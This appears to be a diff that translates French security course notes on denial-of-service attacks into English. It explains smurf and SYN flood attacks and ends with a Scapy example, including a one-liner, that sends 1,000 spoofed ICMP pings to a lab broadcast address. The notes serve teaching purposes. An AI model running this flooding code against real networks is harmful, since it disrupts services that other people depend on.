@@ -1,21 +1,22 @@
-## Déni de service
+## Denial of service
 
-Concept : Consiste à remplir une zone de stockage ou un canal de communication jusqu'à ce que l'on ne puisse plus l'utiliser.
+Concept: Filling a storage area or communication channel until it can no longer be used.
 
-### DoS par smurf
+### DoS by smurf
 
-* La machine attaquante envoie un ping à des serveurs de broadcast
-* Le serveur répercute la requête sur l'ensemble du réseau
-* Toutes les machines répondent au serveur de broadcast
-* Les serveurs redirigent les réponses vers la cible.
+* The attacking machine sends a ping to broadcast servers
+* The server echoes the request throughout the network
+* All machines respond to the broadcast server
+* The servers redirect the responses to the target.
 
-### DoS par SYN flood
+### DoS by SYN flood
 
-* S'applique dans le cadre du protocole TCP
-* consiste à envoyer une succession de requête SYN vers la cible
+* Applies to the TCP protocol
+* consists of sending a succession of SYN requests to the target
 
 
-### Exemples
+
+### Examples
 
 
 **Metasploit**
@@ -35,8 +36,8 @@ i.dst = "192.168.133.255"
 
 ping = ICMP()
 requete = (i/ping)
-send(requete) # lancer wireshark
+send(requete) # run wireshark
 
-# en 1 ligne
+# in 1 lign
 send(IP(dst="192.168.133.255", src="192.168.133.129")/ICMP(), count=1000, verbose=1)
 ```
